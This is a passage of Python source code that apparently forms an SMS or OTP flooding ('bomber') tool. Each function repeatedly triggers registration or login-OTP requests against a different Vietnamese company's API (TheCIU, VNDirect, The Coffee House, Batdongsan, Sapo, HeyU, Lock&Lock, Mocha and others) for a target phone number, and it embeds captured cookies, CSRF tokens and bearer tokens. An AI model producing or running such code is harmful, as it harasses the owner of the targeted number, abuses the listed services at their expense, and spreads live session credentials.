        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }
    random_email = generate_random_email()
    json_data = {
        'phone': sdt,
        'email': random_email,
        'password': '123123aA@',
        'password_confirmation': '123123aA@',
        'first_name': 'huynh',
        'last_name': 'tran',
    }

    response = requests.post('https://api.theciu.vn/api/register', headers=headers, json=json_data)
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer 100914|o6zoFx9fXQSqUtg9tFThrzPfD3w7NLPByck2hahHe2a094ba',
        'content-type': 'application/json',
        'origin': 'https://theciu.vn',
        'priority': 'u=1, i',
        'referer': 'https://theciu.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'username': sdt,
    }

    try:
        response = requests.post('https://api.theciu.vn/api/send-login-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THECIU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THECIU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vndirect():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'https://mydgo.vndirect.com.vn',
        'Referer': 'https://mydgo.vndirect.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'template': 'sms_otp_trading_vi',
        'send': sdt,
        'type': 'PHONE',
    }

    try:
        response = requests.get('https://id.vndirect.com.vn/authentication/otp/', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNDIRECT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNDIRECT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thecoffeehouse():
    headers = {
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'src': 'TCH-WEB',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'TCH-DEVICE-ID': '590fa496-f731-4d34-9191-1a9be1bb716a',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Referer': 'https://order.thecoffeehouse.com/',
        'TCH-APP-VERSION': '5.3.0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    json_data = {
        'phone': {
            'phone_number': sdt,
            'region_code': '+84',
            'timeSentOtp': 0,
        },
    }
    
    try:
        response = requests.post('https://api.thecoffeehouse.com/api/v5/auth/request-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THECOFFEEHOUSE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THECOFFEEHOUSE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def batdongsan():
    cookies = {
        '.AspNetCore.Antiforgery.VyLW6ORzMgk': 'CfDJ8Oujop1d1WlBtd9ARldGgxDrLJpqxRk96NOTqnbuX3qvqvkZzXWMFPrkmPEP1tG82djw9txirvqUH8hUnr3mSyzUHkM6JuLiQ9bpMsMAB-slD12xM6TLZCbPKtiKv2NLxWf3va_mNvyc45Rlle1xcgs',
        'con.ses.id': '3b1f3461-4ead-4ac9-afdf-e2e906de4a5d',
        'con.unl.lat': '1733331600',
        'con.unl.sc': '2',
        '_cfuvid': 'CCRKxynsVApErEE1T9nwb_DVUp6l_E1g3pUvC.OY4Y8-1733408471074-0.0.1.1-604800000',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%228f2fbcf6-734c-469e-8265-ac51c70114b7%22%2C%22expireDate%22%3A%222025-12-05T21%3A23%3A13.0642431Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%227d6f8174-c806-42f2-8ecf-ea63c95f24a2%22%2C%22expireDate%22%3A%222025-12-05T21%3A23%3A13.064274Z%22%7D',
        'cf_clearance': 'ZwpkfjQoK.fr51SIYxIggDStDF.Gq9ZXrN2IHQRlm60-1733408770-1.2.1.1-b.AE4m2VAoe7Y5LVH2zbR1_91XgZ1z9KRrfGrp4vvutvzlVGS6.Uh2akmgW7iAPKDjCN3GuvppGp7BMbs5k6jEKZ4Dua4fS0g92m7FlOIiYHijeqj1Fso2lkTELFYcPCr3mYOs5gAayLiLvlEv.RicZRn24uYvTD7THKfqKcsB5L6zwf40dVEq_N8nNpEUDy2q8p65lOuW7kBGUpPHpvFFDuNqrhzeKjZ.g5CAPdJM89MA0X.FNkJoxd4gOxPRBA6enwSebaNn80cirr5x_jocZQ8gS6SfKm0H4LDDjiRqu06jEVEtktZ2_K.Z15Cg.c1vEUydncZkcb9LgGY74U4bo2LuUZonLy6izrVrogKw2KGQQvbEGQtm2HbPPjPVqKAyADVAkx6it2pFY8BZPphUy54K_bF47AUfpfCIgWWFZxKp92C9oU8FhXJsxr1XEtYXq.NR6WowXklGjVSwts7g',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': '.AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8Oujop1d1WlBtd9ARldGgxDrLJpqxRk96NOTqnbuX3qvqvkZzXWMFPrkmPEP1tG82djw9txirvqUH8hUnr3mSyzUHkM6JuLiQ9bpMsMAB-slD12xM6TLZCbPKtiKv2NLxWf3va_mNvyc45Rlle1xcgs; con.ses.id=3b1f3461-4ead-4ac9-afdf-e2e906de4a5d; con.unl.lat=1733331600; con.unl.sc=2; _cfuvid=CCRKxynsVApErEE1T9nwb_DVUp6l_E1g3pUvC.OY4Y8-1733408471074-0.0.1.1-604800000; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%228f2fbcf6-734c-469e-8265-ac51c70114b7%22%2C%22expireDate%22%3A%222025-12-05T21%3A23%3A13.0642431Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%227d6f8174-c806-42f2-8ecf-ea63c95f24a2%22%2C%22expireDate%22%3A%222025-12-05T21%3A23%3A13.064274Z%22%7D; cf_clearance=ZwpkfjQoK.fr51SIYxIggDStDF.Gq9ZXrN2IHQRlm60-1733408770-1.2.1.1-b.AE4m2VAoe7Y5LVH2zbR1_91XgZ1z9KRrfGrp4vvutvzlVGS6.Uh2akmgW7iAPKDjCN3GuvppGp7BMbs5k6jEKZ4Dua4fS0g92m7FlOIiYHijeqj1Fso2lkTELFYcPCr3mYOs5gAayLiLvlEv.RicZRn24uYvTD7THKfqKcsB5L6zwf40dVEq_N8nNpEUDy2q8p65lOuW7kBGUpPHpvFFDuNqrhzeKjZ.g5CAPdJM89MA0X.FNkJoxd4gOxPRBA6enwSebaNn80cirr5x_jocZQ8gS6SfKm0H4LDDjiRqu06jEVEtktZ2_K.Z15Cg.c1vEUydncZkcb9LgGY74U4bo2LuUZonLy6izrVrogKw2KGQQvbEGQtm2HbPPjPVqKAyADVAkx6it2pFY8BZPphUy54K_bF47AUfpfCIgWWFZxKp92C9oU8FhXJsxr1XEtYXq.NR6WowXklGjVSwts7g',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"114.0.5282.235"',
        'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.186", "Not;A=Brand";v="24.0.0.0", "Opera";v="114.0.5282.235"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.get(
            'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
            params=params,
            cookies=cookies,
            headers=headers,
            verify=False,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BATDONGSAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BATDONGSAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapo():
    cookies = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '12/05/2024 21:36:43',
        'pageview': '1',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'landing_page=https://www.sapo.vn/; start_time=12/05/2024 21:36:43; pageview=1',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'FullName': 'dat tran',
        'StoreName': 'FFDAT2 CFG',
        'PhoneNumber': sdt,
        'City': 'Hồ Chí Minh',
        'PackageTitle': 'sapo_go_v3',
        'ConfirmPolicy': True,
        'Preferred': '',
        'SaleName': '',
        'Reference': '',
        'Source': 'https://www.sapo.vn/',
        'Referral': '',
        'Campaign': '',
        'LandingPage': 'https://www.sapo.vn/',
        'StartTime': '12/05/2024 21:36:43',
        'EndTime': '12/05/2024 21:36:49',
        'PageView': '1',
        'AffId': '',
        'AffTrackingId': '',
        'SalesTeam': '',
        'SocialSource': '',
        'FacebookName': '',
        'FacebookAvatar': '',
    }

    try:
        response = requests.post('https://www.sapo.vn/Register/RegisterTrial', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def heyu():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-version': '119635',
        'authorization': '3ffe20d81a3efebd963bfd8b57499a19',
        'content-type': 'application/json',
        'origin': 'https://book.heyu.vn',
        'priority': 'u=1, i',
        'referer': 'https://book.heyu.vn/login',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'regionName': None,
        'nativeVersion': 2027,
        'reqT': 1733409998351,
    }

    try:
        response = requests.post('https://book.heyu.vn/api/sms/send-code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HEYU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HEYU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def minhtuanmobile():
    cookies = {
        'PHPSESSID': 'v32c31vok6ljv2hscv6hh9p1t2',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=v32c31vok6ljv2hscv6hh9p1t2',
        'origin': 'https://minhtuanmobile.com',
        'priority': 'u=1, i',
        'referer': 'https://minhtuanmobile.com/khach-hang-than-thiet/create/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'checksess': 'v32c31vok6ljv2hscv6hh9p1t2',
    }

    try:
        response = requests.post(
            'https://minhtuanmobile.com/khach-hang-than-thiet/create-checkphone/',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MINHTUANMOBILE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MINHTUANMOBILE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def locknlock():
    cookies = {
        'cqcid': 'bc2pwba2f6bzIBYoH9NwMk5yDF',
        'cquid': '||',
        'dwanonymous_4afbed1a42ca1ef59ef40fb413247d4b': 'bc2pwba2f6bzIBYoH9NwMk5yDF',
        '__cq_dnt': '0',
        'dw_dnt': '0',
        'dwac_e132a2e7b4a15372cda67ea59e': 'A9jNbagcWeLWh37pv3EDZlI6IbOKtxuQOEE%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true',
        'sid': 'A9jNbagcWeLWh37pv3EDZlI6IbOKtxuQOEE',
        'dwsid': 'jUxJw_6jGY2fHf6k-HPJl9yupR3cCFv_cdsXo0qgtj276jzq5dOpWfLXUq7-aJ68SQLoIwWap5YDQw27u8j4Ig==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'cqcid=bc2pwba2f6bzIBYoH9NwMk5yDF; cquid=||; dwanonymous_4afbed1a42ca1ef59ef40fb413247d4b=bc2pwba2f6bzIBYoH9NwMk5yDF; __cq_dnt=0; dw_dnt=0; dwac_e132a2e7b4a15372cda67ea59e=A9jNbagcWeLWh37pv3EDZlI6IbOKtxuQOEE%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true; sid=A9jNbagcWeLWh37pv3EDZlI6IbOKtxuQOEE; dwsid=jUxJw_6jGY2fHf6k-HPJl9yupR3cCFv_cdsXo0qgtj276jzq5dOpWfLXUq7-aJ68SQLoIwWap5YDQw27u8j4Ig==',
        'origin': 'https://www.locknlock.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.locknlock.vn/vi-vn/account-register?step=begin',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': sdt,
        'csrf_token': '3yvq5mUBoIT1Gl-4K6GiuOuyhc1IuWUgdhfsYKkZ0ZhjQxtMLzRNOnJAAM-_oNWNARynnby6Y4LjJjOWPcMqSByW0KeZLwZY0NUoKwLDgf68vud5v7CMOSu6sWIRpGPsxG0k7PJyPFZXryy1mxdFwoa5Rd4fuDGMX9wdkFtAcR6X_bpKarU=',
    }

    try:
        response = requests.post(
            'https://www.locknlock.vn/on/demandware.store/Sites-locknlock-vn-Site/vi_VN/Account-SendProfileVerificationCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LOCKNLOCK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LOCKNLOCK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thamdangstore():
    cookies = {
        'ASP.NET_SessionId': 'q4oyv3y3cd3wrm4gwwlbskgt',
        'reference': 'GOOGLE',
        'languageCode': 'vi',
        'guestId': 'SS_20241206_b26e57a0-1f28-470e-9072-cd73b4b36ae3',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'ASP.NET_SessionId=q4oyv3y3cd3wrm4gwwlbskgt; reference=GOOGLE; languageCode=vi; guestId=SS_20241206_b26e57a0-1f28-470e-9072-cd73b4b36ae3',
        'origin': 'https://thamdangstore.vn',
        'priority': 'u=1, i',
        'referer': 'https://thamdangstore.vn/cong-nang/shop-ban-ao-so-mi-nu-dep-nhat-o-tphcm',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'winId': 'RDID826279',
        'apply': 'yPhM+NHI1I6si1NtaRFxrLo8O9zClKwocWiczEVNxKil5GMRdD1YQw==',
        'm': 'SubmitSignup',
        'formLogin_RDID826281': '{ID:"formLogin_RDID826281",Model:["txtTel_RDID826284","txtPassword_RDID826287"]}',
        'txtTel_RDID826284': '{ID:"txtTel_RDID826284",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'txtPassword_RDID826287': '{ID:"txtPassword_RDID826287",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formSignup_RDID826292': '{ID:"formSignup_RDID826292",Model:["txtNameReg_RDID826295","txtTelReg_RDID826298","txtPasswordReg_RDID826301","txtRePasswordReg_RDID826304"]}',
        'txtNameReg_RDID826295': '{ID:"txtNameReg_RDID826295",Value:"tran van dat",DisplayCount:20,RequiredMsg:"x"}',
        'txtTelReg_RDID826298': f'{{ID:"txtTelReg_RDID826298",Value:"{sdt}",DisplayCount:20,RequiredMsg:"x"}}',
        'txtPasswordReg_RDID826301': '{ID:"txtPasswordReg_RDID826301",Value:"123123aA@",DisplayCount:20,RequiredMsg:"x"}',
        'txtRePasswordReg_RDID826304': '{ID:"txtRePasswordReg_RDID826304",Value:"123123aA@",DisplayCount:20,RequiredMsg:"x"}',
        'formSignupOtp_RDID826308': '{ID:"formSignupOtp_RDID826308",Model:["txtOtpReg_RDID826313"]}',
        'txtTelSignup_RDID826310': '{ID:"txtTelSignup_RDID826310"}',
        'txtOtpReg_RDID826313': '{ID:"txtOtpReg_RDID826313",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formForgotPassword_RDID826316': '{ID:"formForgotPassword_RDID826316",Model:["txtTelForgotPassword_RDID826319"]}',
        'txtTelForgotPassword_RDID826319': '{ID:"txtTelForgotPassword_RDID826319",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formForgotPasswordOtp_RDID826323': '{ID:"formForgotPasswordOtp_RDID826323",Model:["txtForgotPasswordOtp_RDID826326"]}',
        'txtForgotPasswordOtp_RDID826326': '{ID:"txtForgotPasswordOtp_RDID826326",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formNewPassword_RDID826329': '{ID:"formNewPassword_RDID826329",Model:["txtRsPassword_RDID826332","txtRsRePassword_RDID826335"]}',
        'txtRsPassword_RDID826332': '{ID:"txtRsPassword_RDID826332",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'txtRsRePassword_RDID826335': '{ID:"txtRsRePassword_RDID826335",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formCreateNewPassword_RDID826338': '{ID:"formCreateNewPassword_RDID826338",Model:["txtCreateNewPassword_RDID826341","txtCreateNewRePassword_RDID826344"]}',
        'txtCreateNewPassword_RDID826341': '{ID:"txtCreateNewPassword_RDID826341",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'txtCreateNewRePassword_RDID826344': '{ID:"txtCreateNewRePassword_RDID826344",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'formChangePassword_RDID826347': '{ID:"formChangePassword_RDID826347",Model:["txtPasswordOld_RDID826350","txtPasswordNew_RDID826353","txtRePasswordNew_RDID826356"]}',
        'txtPasswordOld_RDID826350': '{ID:"txtPasswordOld_RDID826350",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'txtPasswordNew_RDID826353': '{ID:"txtPasswordNew_RDID826353",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'txtRePasswordNew_RDID826356': '{ID:"txtRePasswordNew_RDID826356",Value:"",DisplayCount:20,RequiredMsg:"x"}',
        'type': '0',
        'metaid': '207',
        'lang': 'vi',
        'sub0': 'cong-nang',
        'sub1': 'shop-ban-ao-so-mi-nu-dep-nhat-o-tphcm',
        '_': '1733481060301',
        'pageParam': 'type=0&metaid=207&lang=vi&sub0=cong-nang&sub1=shop-ban-ao-so-mi-nu-dep-nhat-o-tphcm&_=1733481060301',
    }

    try:
        response = requests.post('https://thamdangstore.vn/Api/Web/DoAction', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THAMDANGSTORE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THAMDANGSTORE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thichsua():
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-12-07%2002%3A00%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fthichsua.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_first_add': 'fd%3D2024-12-07%2002%3A00%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fthichsua.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36%20OPR%2F114.0.0.0',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthichsua.com%2F',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-07%2002%3A00%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fthichsua.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2024-12-07%2002%3A00%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fthichsua.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36%20OPR%2F114.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthichsua.com%2F',
        'origin': 'https://thichsua.com',
        'priority': 'u=1, i',
        'referer': 'https://thichsua.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'action': 'get_otp',
        'phone': sdt,
    }

    try:
        response = requests.post('https://thichsua.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THICHSUA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THICHSUA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha2():
    headers = {
        'Host': 'hlvip.mocha.com.vn:80',
        'uuid': 'EA6C6E3C-2F0A-4BE9-8339-504A081E4C69',
        'Accept': '*/*',
        'countryCode': 'VN',
        'Accept-Language': 'vi-VN;q=1, en-VN;q=0.9, zh-Hans-VN;q=0.8, zh-Hant-VN;q=0.7',
        'languageCode': 'vi',
        'User-Agent': 'mocha/5.99 (iPhone; iOS 15.8.2; Scale/2.00)',
        'gender': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'clientType': 'ios',
        'countryCode': 'VN',
        'device': 'iPhone 16',
        'os_version': 'iOS_18',
        'platform': 'ios',
        'revision': '11720',
        'username': sdt,
        'version': '5.99',
    }

    try:
        response = requests.post('http://hlvip.mocha.com.vn:80/ReengBackendBiz/genotp/v33', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

